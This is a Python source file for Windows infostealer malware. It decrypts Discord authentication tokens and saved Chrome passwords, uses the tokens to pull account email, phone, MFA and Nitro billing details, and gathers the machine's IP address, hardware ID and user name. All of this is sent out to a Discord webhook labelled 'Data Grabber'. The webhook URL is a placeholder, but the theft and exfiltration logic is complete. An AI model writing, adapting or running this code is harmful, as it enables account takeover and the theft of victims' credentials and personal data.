import os
import json
import sqlite3
import shutil
from datetime import datetime
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
import requests
#chrome encrypt files in AES-GCM format
#master key for the format faund on the pc in phisical dir and using CryptProtectData func

WEBHOOK_URL = "your demo webhook"

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

def get_ip():
    try:
        return urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        return "None"

def get_hwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1].strip()

def collect_discord_tokens():
    tokens, cleaned = [], []
    local, roaming = os.getenv('LOCALAPPDATA'), os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Chrome': chrome + '\\Default'
    }
    collected = []

    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + "\\Local State", "r") as file:
                key = b64decode(json.loads(file.read())['os_crypt']['encrypted_key'])[5:]
        except:
            continue

        leveldb = path + "\\Local Storage\\leveldb\\"
        if not os.path.exists(leveldb): continue

        for filename in os.listdir(leveldb):
            if not filename.endswith((".ldb", ".log")): continue
            try:
                with open(os.path.join(leveldb, filename), errors="ignore") as f:
                    for line in f:
                        for token in line.split():
                            if "dQw4w9WgXcQ:" in token:
                                try:
                                    raw = token.split("dQw4w9WgXcQ:")[1]
                                    decrypted = decrypt(b64decode(raw), key)
                                    if decrypted not in cleaned:
                                        cleaned.append(decrypted)
                                except:
                                    continue
            except:
                continue

    for token in cleaned:
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        try:
            res = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            if res.status_code == 200:
                data = res.json()
                billing = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers).json()
                nitro = len(billing) > 0
                collected.append({
                    "platform": platform,
                    "username": f'{data["username"]}#{data["discriminator"]}',
                    "user_id": data["id"],
                    "email": data.get("email"),
                    "phone": data.get("phone"),
                    "mfa_enabled": data.get("mfa_enabled"),
                    "nitro": nitro,
                    "token": token
                })
        except:
            continue
    return collected

def copy_db(db_path):
    temp_path = os.path.join(os.environ['TEMP'], os.path.basename(db_path) + "_copy")
    shutil.copy2(db_path, temp_path)
    return temp_path

def collect_chrome_logins():
    user_data_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
    logins = []
    for profile in os.listdir(user_data_path):
        if profile not in ["Default"] and not profile.startswith("Profile"):
            continue
        profile_path = os.path.join(user_data_path, profile)
        login_data_path = os.path.join(profile_path, 'Login Data')
        if not os.path.exists(login_data_path):
            continue
        try:
            temp_db = copy_db(login_data_path)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for origin_url, username, password_blob in cursor.fetchall():
                if not username:
                    continue
                try:
                    password = win32crypt.CryptUnprotectData(password_blob, None, None, None, 0)[1].decode()
                except Exception as e:
                    password = f"<error: {e}>"
                logins.append({
                    "profile": profile,
                    "site": origin_url,
                    "username": username,
                    "password": password
                })
            cursor.close()
            conn.close()
            os.remove(temp_db)
        except:
            continue
    return logins
#json for https post format
def send_to_discord(data):
    json_data = json.dumps(data, indent=2, ensure_ascii=False)
    MAX_LEN = 1900
    if len(json_data) <= MAX_LEN:
        payload = {"content": f"```json\n{json_data}\n```", "username": "Data Grabber"}
        requests.post(WEBHOOK_URL, data=json.dumps(payload), headers={"Content-Type": "application/json"})
    else:
        for i in range(0, len(json_data), MAX_LEN):
            part = json_data[i:i+MAX_LEN]
            payload = {"content": f"```json\n{part}\n```", "username": "Data Grabber"}
            requests.post(WEBHOOK_URL, data=json.dumps(payload), headers={"Content-Type": "application/json"})

if __name__ == "__main__":
    all_data = {
        "device_info": {
            "ip": get_ip(),
            "hwid": get_hwid(),
            "user": os.getenv("UserName"),
            "pc_name": os.getenv("COMPUTERNAME")
        },
        "discord_accounts": collect_discord_tokens(),
        "chrome_logins": collect_chrome_logins()
    }
    send_to_discord(all_data)
#THANK FOR INSPECTING MY PROJECT ;)
